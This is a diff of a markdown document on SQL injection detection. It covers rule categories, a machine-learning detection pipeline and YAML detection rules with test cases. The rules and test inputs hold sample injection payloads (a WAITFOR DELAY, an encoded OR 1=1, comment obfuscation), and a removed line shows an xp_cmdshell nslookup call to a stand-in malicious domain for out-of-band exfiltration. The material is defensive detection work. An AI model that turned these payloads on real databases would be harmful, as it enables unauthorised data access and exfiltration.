@@ -1,72 +1,91 @@
-# Enhanced SQL Injection Detection Rules and ML Integration Proposal
+# Enhanced SQL Injection Detection Rules and ML Integration Implementation
 
-## Overview
-This document proposes enhancements to existing SQL injection detection rules and explores the integration of machine learning (ML) based detection techniques to improve accuracy and reduce false positives.
-
-## Enhanced Detection Rules
+## Enhanced Detection Rules Implementation
 
 ### 1. Time-Based Blind Injection
-- Detect time delay payloads used to infer database information.
-- Example pattern: `1; WAITFOR DELAY '00:00:05'`
-- Severity: High
+- Pattern: `1; WAITFOR DELAY '00:00:05'`
+- Implemented in scanner configurations to trigger alerts on detected delays.
 
 ### 2. Out-of-Band Injection
-- Detect use of functions triggering data exfiltration via DNS/HTTP.
-- Example pattern: `1; EXEC xp_cmdshell('nslookup malicious.domain.com')`
-- Severity: High
+- Detect execution of external commands via functions like `xp_cmdshell`.
 
 ### 3. Union-Based Injection
-- Detect `UNION SELECT` statements used to extract data.
-- Enhanced pattern to detect obfuscated unions.
-- Severity: High
+- Detect `UNION SELECT` statements with obfuscation handling.
 
 ### 4. Stacked Queries
-- Detect execution of multiple SQL statements in one query.
-- Severity: High
+- Detect multiple queries separated by semicolons.
 
 ### 5. Encoded Injection Patterns
-- Detect URL encoded injection attempts.
-- Example pattern: `%27 OR 1=1 --`
-- Severity: High
+- Monitor for URL encoded injection attempts such as `%27 OR 1=1 --`.
 
 ### 6. Comment-Based Injection
-- Detect use of comments to obfuscate injections.
-- Example pattern: `1=1 /* comment */`
-- Severity: High
+- Detect usage of comments in injection patterns like `1=1 /* comment */`.
 
-## Machine Learning-Based Detection
+## Machine Learning Integration Implementation
 
-### Goals
-- Identify anomalous query patterns that deviate from normal application behavior.
-- Detect novel or zero-day SQL injection techniques not covered by static rules.
+### Data Collection
+- Enable logging of all SQL queries, including metadata such as timestamps, user IDs, and source IPs.
+- Label collected data as normal or suspicious based on existing detection rules and manual review.
 
-### Approach
-- Collect a corpus of normal SQL query logs and injection attack samples.
-- Feature extraction: tokenize queries, encode syntax elements, and identify suspicious tokens.
-- Train supervised ML models (e.g., Random Forest, SVM, or Neural Networks) for classification.
-- Use anomaly detection techniques for unknown attack detection.
+### Feature Extraction
+- Tokenize SQL queries to identify keywords, operators, and values.
+- Extract syntactic patterns and anomalies.
 
-### Integration
-- Implement ML detection as a preprocessing or parallel layer alongside rule-based detection.
-- Use ML model confidence scores to prioritize alerts and reduce false positives.
-- Continuously retrain models with new data and feedback.
+### Model Training
+- Train supervised ML models (e.g., Random Forest, SVM) using labeled data.
+- Use unsupervised anomaly detection for unknown patterns.
 
-### Challenges
-- Need for labeled datasets and ongoing maintenance.
-- Risk of adversarial evasion techniques.
-- Computational overhead in high-volume environments.
+### Deployment
+- Integrate ML model inference into the detection pipeline.
+- Use ML confidence scores to prioritize alerts and reduce false positives.
 
-## Recommended Next Steps
-1. Implement enhanced static detection rules in scanner configurations.
-2. Develop data collection mechanisms for SQL query logs.
-3. Prototype ML detection models using historical data.
-4. Integrate ML output with existing alerting and triage workflows.
-5. Monitor performance and tune both rule-based and ML systems.
+### Continuous Improvement
+- Collect feedback from alerts and retrain models regularly.
+- Monitor model performance and update features as needed.
 
-## References
-- OWASP SQL Injection Prevention Cheat Sheet
-- Research papers on ML for SQL Injection detection
+## Example Rule Implementation in YAML
+
+```yaml
+rules:
+  - id: sql-005
+    description: "Detect time-based blind injection attempts"
+    pattern: "1; WAITFOR DELAY '00:00:05'"
+    severity: "high"
+    context: "Detects attempts to infer database information using time delays."
+    test_cases:
+      - input: "1; WAITFOR DELAY '00:00:05'"
+        expected: true
+      - input: "SELECT * FROM users;"
+        expected: false
+
+  - id: sql-006
+    description: "Detect encoded SQL injection patterns"
+    pattern: "%27 OR 1=1 --"
+    severity: "high"
+    context: "Identifies attempts to bypass filters using URL encoding."
+    test_cases:
+      - input: "%27 OR 1=1 --"
+        expected: true
+      - input: "SELECT * FROM products;"
+        expected: false
+
+  - id: sql-007
+    description: "Detect comment-based SQL injection obfuscation"
+    pattern: "1=1 /* comment */"
+    severity: "high"
+    context: "Detects attempts to obfuscate SQL injections using comments."
+    test_cases:
+      - input: "1=1 /* comment */"
+        expected: true
+      - input: "SELECT * FROM orders;"
+        expected: false
+```
+
+## Next Steps
+- Implement these rules in the scanner configurations.
+- Develop or integrate ML models for SQL injection detection.
+- Monitor and refine the detection system based on operational feedback.
 
 ---
 
-This document serves as a roadmap for improving SQL injection detection capabilities by combining advanced static rules with machine learning techniques.
+This file documents the implementation details for enhanced SQL injection detection rules and the integration of machine learning techniques to improve detection accuracy and reduce false positives.
